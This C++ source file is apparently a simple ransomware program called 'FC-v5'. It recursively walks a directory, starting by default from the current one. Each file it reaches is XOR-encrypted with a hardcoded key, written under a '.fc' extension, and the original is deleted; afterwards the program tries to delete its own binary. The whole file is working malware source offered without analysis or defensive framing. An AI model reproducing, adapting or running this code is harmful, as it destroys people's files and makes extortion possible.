#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <algorithm>
#include <dirent.h>
#include <cstring>
#include <unistd.h>

#include <sys/stat.h>

const std::string key = "fastcryptor_for_the_win_haha";
const int BUFFER_SIZE = 4096;

bool isFileWhitelisted(const std::string& fileName)
{
    const std::vector<std::string> whitelist_files = {"./FC-v5.exe", "./FC-v5_DECRYPTOR.exe"};

    if (std::find(whitelist_files.begin(), whitelist_files.end(), fileName) != whitelist_files.end()) {
        return true;
    }

    return false;
}

bool isDirectoryWhitelisted(const std::string& dirName)
{
    const std::vector<std::string> whitelist_dirs = {};

    if (std::find(whitelist_dirs.begin(), whitelist_dirs.end(), dirName) != whitelist_dirs.end()) {
        return true;
    }

    return false;
}

void encryptFile(const std::string& fileName)
{
    if (isFileWhitelisted(fileName)) {
        std::cout << "Skipping encryption for whitelisted file: " << fileName << std::endl;
        return;
    }

    std::ifstream inputFile(fileName, std::ios::binary);
    if (!inputFile.is_open()) {
        std::cerr << "Error opening file: " << fileName << std::endl;
        return;
    }

    if (fileName.length() > 3 && fileName.substr(fileName.length() - 3) == ".fc") {
        return; 
    }

    size_t dotPos = fileName.rfind('.');
    std::string baseName;
    std::string extension;

    if (dotPos != std::string::npos){
        baseName = fileName.substr(0, dotPos);
        extension = fileName.substr(dotPos);
    }else {
        baseName = fileName;
        extension = "";
    }
    
    std::vector<char> buffer(BUFFER_SIZE);
    // filename = "file.fc" length = 6 
    std::string encryptedFileName = baseName + ".fc"; // Instead we will make the file extension included into the file itself and we will use it later to decrypt it

    std::ofstream outputFile(encryptedFileName, std::ios::binary);
    if (!outputFile.is_open()) {
        std::cerr << "Error opening file: " << encryptedFileName << std::endl;
        return;
    }

    char extBytes[4] = {0};
    
    std::copy(extension.begin(), extension.begin() + std::min<size_t>(4, extension.length()), extBytes);

    for (int i = 0; i < 4; i++) {
    extBytes[i] ^= key[i % key.length()];
    }
    
    outputFile.write(extBytes, 4);

    // The encryption code
    size_t global_offset = 4;

    while (inputFile) {
        inputFile.read(buffer.data(), BUFFER_SIZE);
        std::streamsize bytesRead = inputFile.gcount();

        for (std::streamsize i = 0; i < bytesRead; i++) {
            buffer[i] ^= key[(global_offset + i) % key.length()];
        }

        outputFile.write(buffer.data(), bytesRead);
        global_offset += bytesRead;
    }
    // End
    inputFile.close();
    outputFile.close();

    if (unlink(fileName.c_str()) != 0) {
        std::cerr << "Error deleting file: " << fileName << std::endl;
    }

    std::cout << "Encrypted file: " << fileName << std::endl;
}

void encryptDirectory(const std::string& dirName)
{
    if (isDirectoryWhitelisted(dirName)) {
        std::cout << "Skipping encryption for whitelisted directory: " << dirName << std::endl;
        return;
    }

    DIR *dir;
    struct dirent *ent;
    if ((dir = opendir(dirName.c_str())) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            std::string fileName = dirName + "/" + ent->d_name;
            struct stat st;
            if (stat(fileName.c_str(), &st) == 0) {
                if (S_ISREG(st.st_mode)) {
                    encryptFile(fileName);
                } else if (S_ISDIR(st.st_mode) && strcmp(ent->d_name, ".") != 0 && strcmp(ent->d_name, "..") != 0) {
                    encryptDirectory(fileName);
                }
            }
        }
        closedir(dir);
    } else {
        std::cerr << "Error opening directory: " << dirName << std::endl;
    }
}

int main(int argv, char *argc[])
{
    if (argv < 2){
        encryptDirectory(".");
    }else {
        encryptDirectory(argc[1]);
    }
    if (unlink("FC4") != 0) {
        if (unlink("./FC4.exe") != 0) {
            std::cerr << "Error deleting file: FC4" << std::endl;
        }
    }

    return 0;
}
